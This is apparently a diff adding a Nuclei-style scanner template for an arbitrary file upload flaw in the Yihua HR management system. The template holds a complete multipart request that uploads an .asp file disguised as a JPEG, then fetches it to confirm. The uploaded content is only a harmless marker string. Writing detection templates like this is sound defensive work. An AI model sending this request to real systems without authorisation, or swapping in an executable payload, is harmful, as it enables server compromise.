@@ -1,0 +1,58 @@
+id: poc-yaml-dataworld-unloadfile-upload-rce
+
+info:
+  name: 亿华人力资源管理系统unloadfile存在任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/handle/unloadfile.ashx"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394
+    body: |
+      -----------------------------21909179191068471382830692394
+      Content-Disposition: form-data; name="file"; filename="stc.asp"
+      Content-Type: image/jpeg
+
+      This website has a vulnerability
+      -----------------------------21909179191068471382830692394
+      Content-Disposition: form-data; name="action"
+
+      unloadfile
+      -----------------------------21909179191068471382830692394
+      Content-Disposition: form-data; name="filepath"
+
+      ./
+      -----------------------------21909179191068471382830692394--
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        part: body
+        regex:
+          - "\\\"filename\\\":\\\"(?P<filename>.*?).asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "UpdateSuccess"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/handle/{{filename}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "This website has a vulnerability"
